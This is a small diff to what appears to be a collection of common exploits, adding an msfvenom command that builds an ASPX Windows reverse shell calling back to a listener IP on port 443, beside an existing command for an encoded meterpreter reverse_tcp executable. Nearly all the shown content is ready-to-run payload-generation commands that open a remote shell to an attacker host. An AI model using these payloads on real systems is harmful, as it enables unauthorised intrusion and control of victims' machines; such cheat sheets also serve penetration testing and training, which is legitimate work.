@@ -10,6 +10,9 @@ In this site I am attempting to collect most of the common exploits that appear 
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+For aspx Reverse shell:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.242 LPORT=443 -f aspx -o rev.aspx
+
 ```
 
 ```bash
